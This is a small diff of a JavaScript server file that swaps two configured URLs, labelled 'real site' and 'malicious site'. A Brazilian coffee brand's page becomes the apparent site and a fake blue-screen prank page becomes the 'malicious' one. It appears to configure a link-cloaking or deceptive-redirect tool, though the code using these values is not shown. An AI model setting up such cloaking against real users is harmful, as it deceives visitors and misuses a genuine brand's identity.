@@ -13,9 +13,9 @@ const port = 3000;
 
 
 /* ---------------------------------- Modifique abaixo */ 
-const siteReal = "https://pranx.com/blue-death/";
+const siteReal = "https://www.nescafe-dolcegusto.com.br/";
 
-const siteMalicioso = "https://www.nescafe-dolcegusto.com.br/"
+const siteMalicioso = "https://pranx.com/blue-death/"
 /* ----------------------------------*/ 
 
 
